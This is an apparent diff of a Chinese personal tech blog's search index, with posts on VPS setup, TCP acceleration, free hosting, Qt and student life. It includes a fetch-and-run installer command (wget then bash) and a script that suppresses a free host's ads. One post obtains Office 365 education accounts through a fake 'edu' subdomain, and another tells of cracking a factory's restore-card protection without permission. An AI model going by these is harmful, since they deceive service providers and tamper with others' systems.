+    <content type="text"><![CDATA[在 Linux vps 下挂载谷歌云盘小记： 1. 准备 Ubuntu 16.04 google-drive-ocamlfuse 2. 安装123sudo add-apt-repository ppa:alessandro-strada/ppa -ysudo apt-get updatesudo apt-get install google-drive-ocamlfuse 3. 申请谷歌云盘 API访问：Google Drive Api 然后创建 Credentials： 然后会生成： Client ID、Client secret 4. 开始挂载云盘12345google-drive-ocamlfuse -id [替换为 Client ID] -secret [替换为 Client secret]# 创建挂载点mkdir /drive# 开始挂载google-drive-ocamlfuse /drive 附上效果图 /drive 另外还有 rclone/gdrive 等工具可供选择。用途：可以像访问本地文件一样访问谷歌云盘，另外可以做一些数据备份、数据迁移、扩充 vps 磁盘容量等方面的用途，线路方面最好选择对谷歌骨干网有优化的效果最好，比如说用 Google cloud。]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>干货分享</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>谷歌</tag>
+        <tag>vps</tag>
+        <tag>云盘</tag>
+        <tag>挂载</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Alpine linux 谷歌代理搭建]]></title>
+    <url>%2Fblog%2F2016%2F10%2F23%2FAlpine-linux-google-proxy%2F</url>
+    <content type="text"><![CDATA[最近研究了一段时间的 Alpine Linux，然后把自己搭建谷歌代理的搭建简单记录一下： 1234567891011121314151617apk updatecd /root# 安装编译所需依赖包apk add --update alpine-sdkwget http://nginx.org/download/nginx-1.12.1.tar.gzgit clone https://github.com/cuber/ngx_http_google_filter_modulegit clone https://github.com/yaoweibin/ngx_http_substitutions_filter_moduleapk add gd-devapk add openssl-devapk add geoip-devapk add automakeapk add autoconfwget https://ftp.pcre.org/pub/pcre/pcre-8.41.zipunzip pcre-8.41.zip# 开始配置编译环境./configure --with-pcre-jit --with-ipv6 --with-http_ssl_module --with-http_stub_status_module --with-http_realip_module --with-http_addition_module --with-http_geoip_module --with-http_gzip_static_module --with-http_image_filter_module --with-http_sub_module --with-mail --with-mail_ssl_module --add-module=/root/ngx_http_google_filter_module --add-module=/root/ngx_http_substitutions_filter_module --with-pcre=/root/nginx-1.12.1/pcre-8.41make &amp;&amp; make install 然后按照 https://github.com/yaoweibin/ngx_http_substitutions_filter_module 下面的教程就可以搭建成功了。]]></content>
+      <categories>
+        <category>操作系统</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Google</tag>
+        <tag>alpine</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Cloudflare 太多重定向]]></title>
+    <url>%2Fblog%2F2016%2F10%2F22%2FCloudflare-too-many-redirect%2F</url>
+    <content type="text"><![CDATA[今天配置 nginx + cloudflare 加速的时候出现 Too Many Redirects Error, 也就是重定向太多，网站打不开，然后折腾了一下，解决了，然后记录一下解决过程： 解决方式一，修改 cloudflare 控制面板设置 设置 flexible 为 full（strict) 解决方式二，修改 nginx 配置，移除和 302 重定向 相关的部分配置。]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>网络加速</category>
+      </categories>
+      <tags>
+        <tag>CDN</tag>
+        <tag>cloudflare</tag>
+        <tag>nginx</tag>
+        <tag>重定向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Google BBR TCP 加速]]></title>
+    <url>%2Fblog%2F2016%2F10%2F11%2FGoogle-BBR-TCP-Acceleration%2F</url>
+    <content type="text"><![CDATA[很多朋友问我，为什么 BBR 加速效果不太明显，其实我想解释一下原因： 安装配置不正确 启动失败 本身线路或网络质量差 我所理解的正确配置 官方介绍地址：https://github.com/google/bbr debian\ubuntu 由于对系统内核有一定要求，我们先要到 ubuntu mainline 下载 4.9 以上的内核： http://kernel.ubuntu.com/~kernel-ppa/mainline/ centos 7 1234567sudo rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.orgsudo rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpmsudo yum --enablerepo=elrepo-kernel install kernel-ml -ysudo egrep ^menuentry /etc/grub2.cfg | cut -f 2 -d \&apos;# 如果上面命令输出最新内核在第几行，那就是行数减一，比如我的在第一行，那就是 0sudo grub2-set-default 0sudo reboot 配置 bbr 1234567891011# 检查 bbr 是否安装grep &apos;CONFIG_TCP_CONG_BBR&apos; /boot/config-$(uname -r)grep &apos;CONFIG_NET_SCH_FQ&apos; /boot/config-$(uname -r)egrep &apos;CONFIG_TCP_CONG_BBR|CONFIG_NET_SCH_FQ&apos; /boot/config-$(uname -r)# 启动 bbr，编辑 sysctl.confsudo vi /etc/sysctl.conf加入：net.core.default_qdisc=fqnet.ipv4.tcp_congestion_control=bbr# 重启系统sudo reboot 配置 bbr 后，其实需要再设置一下确保队列机制为 fq 1tc qdisc replace dev eth0 root fq pacing]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>网络加速</category>
+      </categories>
+      <tags>
+        <tag>bbr</tag>
+        <tag>单边加速</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Tcp 双边加速]]></title>
+    <url>%2Fblog%2F2016%2F10%2F11%2FTcp-bilateral-Accel%2F</url>
+    <content type="text"><![CDATA[前面介绍了 Tcp 单边加速技术，下面介绍一下流行的双边加速，最早使用 Tcp 单边加速的时候，那时候是给 ss 加速，大概在今年一月份的时候发现了 finalspeed，适用各种虚拟化环境。今天趁着介绍单边加速的时候顺带介绍一下。 基本原理：利用UDP 协议封装了 Reliable UDP 协议，自行实现拥塞控制。类似的软件有 kcp-tun，现在这些加速主要和 ss 结合的比较好，但是不好的一点就是消耗更大的流量换来比较稳定的效果，也就是所谓的暴力发包。 使用流程： 下载地址：https://github.com/d1sm/finalspeed 分为服务端和客户端两部分，服务端主要用在服务器环境。 服务端安装 12345wget http://fs.d1sm.net/finalspeed/install_fs.shbash install_fs.sh 2&gt;&amp;1 | tee install.log# cron jobcrontab -e# 添加： `0 2 * * * sh /fs/restart.sh` 每晚 2 点重启 其实安装教程推荐到官网看看： 客户端：http://www.ip4a.com/t/513.html 服务端：http://www.ip4a.com/t/515.html 其他注意事项 java 客户端非常耗电 服务器内存推荐要 128MB 暴力发包可能被主机商封号！！！]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>网络加速</category>
+      </categories>
+      <tags>
+        <tag>Tcp</tag>
+        <tag>加速</tag>
+        <tag>finalspeed</tag>
+        <tag>kcp</tag>
+        <tag>双边加速</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Tcp 单边加速]]></title>
+    <url>%2Fblog%2F2016%2F10%2F11%2FTcp-Edge%2F</url>
+    <content type="text"><![CDATA[最近研究 Tcp 网络加速比较多，最近锐速的 ZetaTcp 单边加速火了，很多群友都在使用，免费加速 20M 带宽，另外还有 FlashTcp，FAST TCP,SuperTCP, BBR, 其实锐速核心原理在于在底层对数据包进行了封装，并动态优化 TCP window 大小，实现更高的传输速度。另外就是在网络异常拥堵的情况下，牺牲流量换来 稳定 体验。 个人测试锐速可以在下面的虚拟化环境下运行， XEN VMWARE Hyper-V KVM 2017.03.20 更新 – 要修改内核参数的加速都不支持 OpenVz，因为 openvz 内核参数无法修改，目前解决 ovz 的主要方法有 LKL，UML，net-speeder。采用 LKL 或 UML 需要有 tun/tap 设备支持。 以上的加速都是适用于 Linux 环境，在 windows 下面我们可以使用，cfosspeed、Amd Quick Stream等等。 参考资料 教程：手把手教你OpenVZ下部署UML，启用BBR… 小内存OpenVZ VPS使用UML开启BBR]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>网络加速</category>
+      </categories>
+      <tags>
+        <tag>单边加速</tag>
+        <tag>Tcp</tag>
+        <tag>加速</tag>
+        <tag>锐速</tag>
+        <tag>BBR</tag>
+        <tag>OpenVZ</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[iptables 生成随机丢包环境]]></title>
+    <url>%2Fblog%2F2016%2F09%2F10%2Fiptables-random-drop-packets%2F</url>
+    <content type="text"><![CDATA[123456# -A 改为 -D 时删除规则# 丢掉 10% 接收的数据包iptables -A INPUT -m statistic --mode random --probability 0.1 -j DROP# 丢掉 10% 发送的数据包iptables -A OUTPUT -m statistic --mode random --probability 0.1 -j DROP 其他方法，使用 tc 123sudo tc qdisc add dev eth0 root netem loss 3%# 删除规则sudo tc qdisc del dev eth0 root netem loss 3%]]></content>
+      <categories>
+        <category>操作系统</category>
+        <category>Linux</category>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>网络安全</tag>
+        <tag>iptables</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[分布式数据库]]></title>
+    <url>%2Fblog%2F2016%2F08%2F17%2Fdistributed-database%2F</url>
+    <content type="text"><![CDATA[随着业务能力的不断增长，数据量的无限增长，传统的数据库 MYSQL、SQL Server、PostgresSQl 已经无法满足日益增长的海量数据。目前解决数据库日益增长的问题有非常多的解决方案，比如说扩容、升级服务器配置、分库分表、分区。但是这些都不是最佳解决方案，然后就出现了分布式数据库，其实分布式数据库就是为了解决数据库单机容量问题而出现的，以前谷歌分享了 Google F1 分布式数据库。其实说的就是数据分布在很多台服务器里面，很多个地区，通过一致性算法，解决了跨数据中心的数据一致性问。国内目前也有在做分布式数据库的开源项目 TiDB，听说是按照谷歌的方式做的。 分布式数据库类型： 分析型数据库，典型的有 Spark、Greenplum 等等，做大数据分析专用 事务型，解决方式目前主要就是 sharding，典型的有 MySQL proxy、Vitess、Cobar 等等，这些开源项目就是通过数据库中间件，数据库代理解决数据库分布式的问题的。TiDB 目前还是开发阶段，个人测试感觉还是性能差了点，以后会更好的。 参考资料： F1: A Distributed SQL Database That Scales TiDB]]></content>
+      <categories>
+        <category>架构</category>
+        <category>分布式</category>
+      </categories>
+      <tags>
+        <tag>数据库</tag>
+        <tag>分布式</tag>
+        <tag>中间件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[arukas docker 免费容器]]></title>
+    <url>%2Fblog%2F2016%2F08%2F10%2Farukas-docker-container%2F</url>
+    <content type="text"><![CDATA[最近比较关注容器技术，今天在 Facebook 看到了这个免费测试容器 arukas.io 全部是东京节点，一个容器可以获取多个 Ip 地址，用来搭建 ss 是非常有意义的，只不过有个缺点就是端口是随机分配的。另外提供很多 api 接口，用官方的 api 接口可以解决重启端口随机分配的问题，整体测试速度还是挺不错的，上 youtube 测试速度可以达到 20000 ～ 40000，还是相当 OK 的。只是测试时间不知道有多久，依照我目前注册的时间来看的话，还可以使用好几个月（免费到 2017年6月30 ）。 20160830 更新 – 在 QQ 群听到很多人说不能注册了，估计是国人太多，提供商扛不住了。早知道不分享到 QQ 群。 20170623 更新 – 免费容器将延长到 2017.07.21]]></content>
+      <categories>
+        <category>免费资源</category>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>免费资源</tag>
+        <tag>docker</tag>
+        <tag>容器</tag>
+        <tag>arukas</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[微服务架构]]></title>
+    <url>%2Fblog%2F2016%2F05%2F07%2Fmicroservice%2F</url>
+    <content type="text"><![CDATA[最近这几年微服务变得非常的流行，尤其在一些大型互联网公司，微服务作为这些平台的底层支柱。微服务的一些个人见解： 在微服务以前实现去单点故障的系统都是通过 SOA 的形式来调用远程 api，其中通信协议就是 RPC – 远程进程调用，在系统内部进程其实也是可以通过 RPC 进行通信交流的。例如游戏架构，其中就包括中心服务器、房间服务器、登录服务器、IM 服务器。中心服务器负责房间的注册和管理，系统消息的分发，房间服务器负责房间人数的管理，房间内的消息的管理。登录服务器负责整体的用户登录。IM 服务器负责用户之间的交流。 后面不断的演化，尤其那些全球化或用户基数很大的公司，在硬件方面无法突破的情况下 – 单机目前可以达到 C10K 这种水平，开始考虑分布式系统，而分布式是微服务里面一个重要的特征，国内比较有名的开源项目 dubbo 就是这种类型，另外就是 netflix 开源的 spring cloud。另外还有很多类似的项目。 在微服务分布式架构下，微服务的里面比较重要的部分有，服务发现注册、API 网关、服务监控。 微服务分布式系统的优势： 无单点故障 扩展能力强 比较好的容错能力 比较好的可测试性 微服务分布式系统的劣势： 开发难度增加 不易调试 部署难度增加]]></content>
+      <categories>
+        <category>架构</category>
+        <category>分布式</category>
+      </categories>
+      <tags>
+        <tag>微服务</tag>
+        <tag>架构</tag>
+        <tag>microservices</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[这几年用过的国内 Linux 发行版]]></title>
+    <url>%2Fblog%2F2015%2F07%2F21%2FChinese-linux%2F</url>
+    <content type="text"><![CDATA[在大学这几年里电脑的操作系统主要是以 Linux 为主，毕竟大部分专业软件都是支持 Linux 的，另外不支持的部分可以使用 wine 技术解决，这几年试着安装了很多国内的发行版，例如： Deepin linux 基于 Ubuntu Start OS 起点操作系统，为 Ylmf OS 的马甲，中文化程度高，自带 ypk 软件包 Qomo Linux，是红旗 Linux 的社区版本，对国产硬件支持程度比较高 Redflag Linux，红旗 Linux，更新慢，各种硬件驱动适配支持良好 共创 Linux，主要是安装在龙芯电脑 其实用了这么久也有点感触，个人认为，国内 Linux 用户主要以开发者为主，另外就是一小部分极客玩家，没有成规模的用户，以政府投资为主导，很多用户刚需解决不了，比如说流畅的玩各种游戏、更加人性化的界面、图形化操作，对于 windows 来说，最重要最核心的就是交互模式图形化，容易上手，虽然说很多国产系统都在走这种路线，但是未来的交互模式估计是多方面多层次更加多样化智能化的，比如说 VR、语音识别、谷歌眼镜类似的那种，估计未来会有一场交互革命。]]></content>
+      <categories>
+        <category>操作系统</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Ubuntu</tag>
+        <tag>Linux</tag>
+        <tag>Deepin</tag>
+        <tag>YlmfOS</tag>
+        <tag>StartOS</tag>
+        <tag>Qomo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[秀一秀新安装的 Ubuntu 14.04]]></title>
+    <url>%2Fblog%2F2015%2F07%2F20%2FUbuntu-14-04-show%2F</url>
+    <content type="text"><![CDATA[Ubuntu 15.04 存在不少问题，很多软件并没有为这个版本编译打包，所以很多软件缺失，不得不又回归到 14.04：]]></content>
+      <categories>
+        <category>操作系统</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Ubuntu</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Ubuntu 15.04]]></title>
+    <url>%2Fblog%2F2015%2F05%2F29%2FUbuntu-15-04%2F</url>
+    <content type="text"><![CDATA[最近 Ubuntu 发布了 15.04，然后下载下来开始折腾，虽然只有几个月的支持时间, 其实用了几年的 Ubuntu，每次更新无非就是很多软件包更新到最新版本，修复一些 BUG，另外就是桌面系统更加稳定，配置更傻瓜式，Ubuntu 的 Dash 固定后前期感觉不是很适应，后面感觉也还行吧！感觉人类的适应能力还是很强的，正中了乔帮主说的那句 – 用户根本不知道自己想要什么样的产品：]]></content>
+      <categories>
+        <category>操作系统</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Ubuntu</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Office365 教育版申请]]></title>
+    <url>%2Fblog%2F2015%2F02%2F10%2FOffice365-edu-application%2F</url>
+    <content type="text"><![CDATA[最近在贴吧和一些论坛看到一些朋友申请了 office365 教育版，然后自己也试试。 申请 office 365 全局管理员，有什么意义呢？ 免费使用 office onedrive 1TB/5TB 另外还有很多其他福利，企业邮箱等等 无限用户，也就是无限开子账号 注册过程 afraid.org 注册 edu 二级域名, 搜索 edu.au edu ac sch 等关键字,每个国家的教育域名后缀都不一样. 具体申请过程可以自行百度，我这里不多说了。 2015.10.20 – 很抱歉各位，我自己申请的全局教育版 翻车 了。最近封杀了很多这种账号，如果长期使用的话建议使用自己母校的邮箱注册，返回购买那个非常便宜的订阅。]]></content>
+      <categories>
+        <category>免费资源</category>
+      </categories>
+      <tags>
+        <tag>免费资源</tag>
+        <tag>office 365</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[OneDrive 直链]]></title>
+    <url>%2Fblog%2F2014%2F05%2F21%2FOneDrive-direct-link%2F</url>
+    <content type="text"><![CDATA[前面介绍了谷歌云盘的直链获取方式，下面介绍微软云盘的： 登陆微软云盘 选择任意文件，右击 embed 然后生成如下所示代码 然后在链接中 https://onedrive.live.com/embed?cid=AB8D57A3580025E4&amp;resid=AB8D57A3580025E4%21107&amp;authkey=AMjGvn4X1tDV7vU ，把 embed 换成 download就可以直接下载了。 一些其他方式分享 注册 office 365 里面提供的 onedrive for Business, 共享的链接全部为直链 使用第三方网站提供的直链生成工具，例如，CloudLinker]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>干货分享</category>
+      </categories>
+      <tags>
+        <tag>网盘</tag>
+        <tag>直链</tag>
+        <tag>OneDrive</tag>
+        <tag>微软云盘</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Google Drive 直链]]></title>
+    <url>%2Fblog%2F2014%2F05%2F21%2FGoogle-Drive-direct-link%2F</url>
+    <content type="text"><![CDATA[最近折腾了一堆国外的网盘，比如说：one drive、Google drive、mega、aws drive、dropbox 等等。今天介绍的是谷歌云盘的直链获取： 例如：https://drive.google.com/open?id=0B5oCvL68v4w9c3RhcnRlcl9maWxlX2Rhc2hlclYw 我们可以看到 id 为：0B5oCvL68v4w9c3RhcnRlcl9maWxlX2Rhc2hlclYw，其中的 id 在获取直链至关重要，那么我们可以通过下面的方式获取直链： https://drive.google.com/uc?export=download&amp;id= 通过这个链接，我们把 id 放到尾部通过浏览器打开就可以直接下载。 https://docs.google.com/uc?export=download&amp;id=,同样把 id 放到尾部就可以实现直链下载， 使用一些工具：gdown.pl、gdrive、drive 一些提供服务的第三方网站：http://directlink.booogle.net、https://gdurl.com、http://www.bagusdl.pro/drive/]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>干货分享</category>
+      </categories>
+      <tags>
+        <tag>Google</tag>
+        <tag>Google drive</tag>
+        <tag>谷歌</tag>
+        <tag>网盘</tag>
+        <tag>直链</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[最近折腾过的免费虚拟主机]]></title>
+    <url>%2Fblog%2F2014%2F05%2F16%2Fusing-free-hosting%2F</url>
+    <content type="text"><![CDATA[折腾过的… ucart.tw cubichost.net ServersFree.com boxhost.me Neq3 jyoti,inc 888webhost.com – 比较稳定 Jelly vhostall.com – 比较稳定 Nazuka.net ClanMark.Com 000webhost.com 小结 大部分主机都是 cpanel 面板，少数的是 directadmin，支持 ssh 命令，可以用来做一些其他特殊服务，比如说 Goagent PHP Server，大部分主机都是 PHP 和 mysql 环境，可以用来做 贴吧签到，挂 QQ，机器人 等等。 ！！！ 另外发现了很多非常稳定的虚拟主机，有需要的话可以小窗口 (at) 我。]]></content>
+      <categories>
+        <category>虚拟主机</category>
+      </categories>
+      <tags>
+        <tag>免费资源</tag>
+        <tag>虚拟主机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[XREA 免费空间广告移除]]></title>
+    <url>%2Fblog%2F2014%2F04%2F20%2FXREA-free-hosting-remove-ad%2F</url>
+    <content type="text"><![CDATA[发现 XREA 的广告实在是比较烦人，根据网上的一些建议的话，可以分为这几种方式： 1. 创建 .htaccess1234LayoutIgnoreURI *.phpLayoutIgnoreURI *.cgiLayoutIgnoreURI *.htm LayoutIgnoreURI *.html 2. wordpress1234567# footer.php&lt;?php$language = substr($_SERVER[&apos;HTTP_ACCEPT_LANGUAGE&apos;],0,2);if($language == &apos;zh&apos;)&#123;echo &apos;&lt;style type=&quot;text/css&quot; media=&quot;screen&quot;&gt;center&#123;display:none;&#125;&lt;/style&gt; &apos;;&#125;?&gt; 3. 个人解决方式 ！！！ 我所认为的最优解 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// 创建一个新的 js 文件到 head 标签里面(function() &#123; if (Element.prototype.addEventListener) &#123; var eventListeners=[]; var addEventListener=function(type,listener /*, useCapture (will be ignored) */) &#123; var self=this; var wrapper=function(e) &#123; e.target=e.srcElement; e.currentTarget=self; if (typeof listener.handleEvent != &apos;undefined&apos;) &#123; listener.handleEvent(e); &#125; else &#123; listener.call(self,e); &#125; &#125;; if (type == &quot;load&quot;) &#123; // 设置 load 方法无效 console.log(&quot;Load -- &quot; + type); return true; &#125; if (type==&quot;DOMContentLoaded&quot;) &#123; var wrapper2=function(e) &#123; if (document.readyState==&quot;complete&quot;) &#123; wrapper(e); &#125; &#125;; document.attachEvent(&quot;onreadystatechange&quot;,wrapper2); eventListeners.push(&#123;object:this,type:type,listener:listener,wrapper:wrapper2&#125;); if (document.readyState==&quot;complete&quot;) &#123; var e=new Event(); e.srcElement=window; wrapper2(e); &#125; &#125; else &#123; this.attachEvent(&quot;on&quot;+type,wrapper); eventListeners.push(&#123;object:this,type:type,listener:listener,wrapper:wrapper&#125;); &#125; &#125;; var removeEventListener=function(type,listener /*, useCapture (will be ignored) */) &#123; var counter=0; while (counter&lt;eventListeners.length) &#123; var eventListener=eventListeners[counter]; if (eventListener.object==this &amp;&amp; eventListener.type==type &amp;&amp; eventListener.listener==listener) &#123; if (type==&quot;DOMContentLoaded&quot;) &#123; this.detachEvent(&quot;onreadystatechange&quot;,eventListener.wrapper); &#125; else &#123; this.detachEvent(&quot;on&quot;+type,eventListener.wrapper); &#125; eventListeners.splice(counter, 1); break; &#125; ++counter; &#125; &#125;; Element.prototype.addEventListener=addEventListener; Element.prototype.removeEventListener=removeEventListener; if (HTMLDocument) &#123; HTMLDocument.prototype.addEventListener=addEventListener; HTMLDocument.prototype.removeEventListener=removeEventListener; &#125; if (Window) &#123; Window.prototype.addEventListener=addEventListener; Window.prototype.removeEventListener=removeEventListener; &#125; &#125;&#125;)(); 个人解决方式的预览页面: https://storage.mmda.info推荐使用第三种方式，第一种方式听说会被删掉空间，最后一种目前正在稳定使用。]]></content>
+      <categories>
+        <category>免费资源</category>
+      </categories>
+      <tags>
+        <tag>免费资源</tag>
+        <tag>虚拟主机</tag>
+        <tag>javascript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[网络系统安装]]></title>
+    <url>%2Fblog%2F2012%2F10%2F06%2FPXE-install-OS%2F</url>
+    <content type="text"><![CDATA[今天 A 同学的系统坏掉了，一直蓝屏，听说是金山毒霸惹的祸，是时候发挥一下技术能力了，记的以前我在网吧装机的时候，都是做好模板系统，然后通过网络克隆的方式部署到其他机器. 工具准备：Ghostcast server ghost 镜像：window7 纯净版.ghost 然后设置 Ghostcast 给笔记本插上网线，打开 pxe，然后开始网络安装，速度还算快，传输速度 12M/s，过程很顺利。 其实以前所说的还原卡破解也是用的这方式，可以说是一种降维 攻击。]]></content>
+      <categories>
+        <category>就爱折腾</category>
+      </categories>
+      <tags>
+        <tag>系统安装</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Qt 编程书籍整理]]></title>
+    <url>%2Fblog%2F2012%2F09%2F17%2FQt-programming-books%2F</url>
+    <content type="text"><![CDATA[C++ GUI Qt 4 编程（第二版）– （加）布兰切特 Advanced Qt Programming- Creating Great Software with C++ and Qt 4 Introduction to Design Patterns in C++ with Qt (2nd Edition) C++ GUI Programming with Qt 4 (2nd Edition) - The official C++/Qt book The Book of Qt 4: The Art of Building Qt Applications 这几本都是比较不错的书籍，最新版 Qt 4.8 非常实用。]]></content>
+      <categories>
+        <category>C++</category>
+      </categories>
+      <tags>
+        <tag>Qt</tag>
+        <tag>C++</tag>
+        <tag>跨平台</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Qt 学习]]></title>
+    <url>%2Fblog%2F2012%2F09%2F16%2FQt-learning-1%2F</url>
+    <content type="text"><![CDATA[其实学习 Qt 基于以下几点： 跨平台 有丰富的文档和教程 论坛资源丰富 国内有不错的产品基于 Qt，比如说 YY、WPS 国内有下载镜像 Qt 框架总览 基于 QtCore 和 QtGui 模块 另外有网络模块，多线程模块，绘图模块、基础组件，图形模块等等 常见跨平台 UI 库 Qt Gtk Wxwidget Tcl]]></content>
+      <categories>
+        <category>C++</category>
+      </categories>
+      <tags>
+        <tag>Qt</tag>
+        <tag>C++</tag>
+        <tag>跨平台</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[稳定免费虚拟主机推荐]]></title>
+    <url>%2Fblog%2F2012%2F09%2F10%2FFree-web-hosting%2F</url>
+    <content type="text"><![CDATA[beget.ru – 俄罗斯老牌 1G Square7 – 老牌虚拟主机 7G Netowl.Jp – 日本乌鸦主机 1G 1Gb.ru – 俄罗斯 1GB CwCity.de – 德国老牌 OpenShift – 很多朋友在用，而且用在科学上网 Free Hostia – 朋友推荐的一家，速度很不错 本站用的就是 beget.ru 免费主机，然后注册了免费域名：losywee.ml，不知不觉这个网站已经免费用了人家免费空间差不多一年了，中间并没有出现什么故障。而且域名不需要设置 ns 记录到这个网站，直接用 cname 或 ip 就好了。]]></content>
+      <categories>
+        <category>免费资源</category>
+      </categories>
+      <tags>
+        <tag>免费资源</tag>
+        <tag>虚拟主机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[大二]]></title>
+    <url>%2Fblog%2F2012%2F09%2F01%2Fsophomore-starting%2F</url>
+    <content type="text"><![CDATA[转眼间就到了大二了，大一过去，虽然感觉学习上学习了很多和专业不相干的内容，但是自己感觉还是挺快乐的，暑假累了一个多月，虽然挣了点小钱，感觉还是赚的比较辛苦的，在此感谢不辞劳苦、不求回报的父母，你们辛苦了！新的一学年，也应该好好的反省一下过去的日子，大一过的比较满意的是，第一件事，没有挂科；第二件事，过了 CET-4 和 CET-6；然后就是了解学习了很多感兴趣的事情，整体阅读量也还行！不满意的事情就是，1，像我这么 帅 的男生，竟然没有女票；2，专业课没有找到兴趣点；3，没有自身的职业规划，其实压力还是非常大的。新的一学年也没有什么特别好规划的，就写下一些期许吧！1、系统性学习一下 C++，Qt，2、IM 系统，3、云计算，4、mysql，5、考专业证书，6、学习一门其他语言（日语）。]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>大学生活</category>
+      </categories>
+      <tags>
+        <tag>大二</tag>
+        <tag>开学</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[2012 暑假（二）]]></title>
+    <url>%2Fblog%2F2012%2F08%2F10%2F2012-summer-vacation-2%2F</url>
+    <content type="text"><![CDATA[在上家公司呆了差不多半个月了吧！非常感谢这家公司的同事和老大，也非常感恩时间！由于朋友的邀请，然后买了火车票去了深圳，在深圳人生地不熟的地方，找了几天实在没找到合适的事情做，然后囊中羞涩了，也没有准备向家里求助，然后看到有招暑假工的工厂，我们几个哥们就一起去了，听说包吃包住，薪资也还行，只要肯耐苦，然后就进去了，这个工厂人比较少，估计是这几年 用工荒 的缘故吧，再加上经济下行压力的冲击，我们几个去的那个车间大概有 10 来人，组长是河南人，人还比较可以，只是冲动了些。工作的话也没啥好说的，比较单调的工作吧，每天就是在非常吵闹的机器声下面整理机器生产出来的产品。住宿方面的话基本就是几个人一个房间，住宿条件一般吧！没想到这么小的工厂也有阅览室和电脑硬件设施，工作了好几天，每天差不多下班就去阅览室看看书和上网，在这里上网搞了点小破坏，把这里的还原卡系统全给破解了，然后重装了系统，安装了很多其他的东西。记的第一次破解还原卡的时候还是高中，其实还原卡的工作原理还是很简单的。]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>大学生活</category>
+      </categories>
+      <tags>
+        <tag>暑假</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[科学上网 Google]]></title>
+    <url>%2Fblog%2F2012%2F08%2F01%2FGoogle-IP-test%2F</url>
+    <content type="text"><![CDATA[谷歌离开国内很长一段时间了，最近使用 GAE 搭建了科学上网，感谢 GoAgent 跨平台代理上网项目。 搭建教程： 在 Google App Engine 创建 ID，每个 ID 每天免费 1GB 流量，需要很多流量的可以多创建几个，一个账号可以创建 10 个左右。 下载 GoAgent 根据教材修改 proxy.ini 然后在谷歌浏览器里面安装 Proxy SwitchSharp 插件，设置代理 GoAgent 创建的本地代理服务器，其他浏览器请自行探索了 附件 Proxy SwitchSharp – 2015 年 5 月更新，据反馈以前的链接失效了 goagent3.2.3 – 2015 年 5 月更新，据反馈以前的链接失效了]]></content>
+      <categories>
+        <category>就爱折腾</category>
+      </categories>
+      <tags>
+        <tag>Google</tag>
+        <tag>科学上网</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[2012 暑假（一）]]></title>
+    <url>%2Fblog%2F2012%2F07%2F12%2F2012-summer-vacation%2F</url>
+    <content type="text"><![CDATA[不知不觉，暑假开始了，回想放假之后，在长沙的一家网络公司随便找了份差事，感觉一天就是打打杂吧，公司整体的业务一般般，主要就是负责一些网络方面的维护，另外就是管理网站服务器，服务器系统是 Centos 5.1 的，相对于我笔记本的 Ubuntu 12.04 来说是在比较老，系统很多软件包都是旧的，比如说系统内核实在太旧。另外 apache 网站服务器很多安全补丁有没有打，然后和公司自告奋勇老大申请半夜起来打系统安全补丁，中间打补丁的时候一不小心把 apache 弄挂了，吓了一大跳，检查了一下 error 日志，找到了原因所在，不然得熬通宵不说，肯定被屌，升级之后用一些黑客工具测试了一下服务器安全性，确认 OK 收工。 建议大家打系统补丁报错的时候多查查日志报错，当然在软件设计开发的时候也要多注意日志方面的功能，否则维护会相当困难。]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>大学生活</category>
+      </categories>
+      <tags>
+        <tag>暑假</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[大一的计算机课]]></title>
+    <url>%2Fblog%2F2012%2F06%2F12%2FComputer-lesson%2F</url>
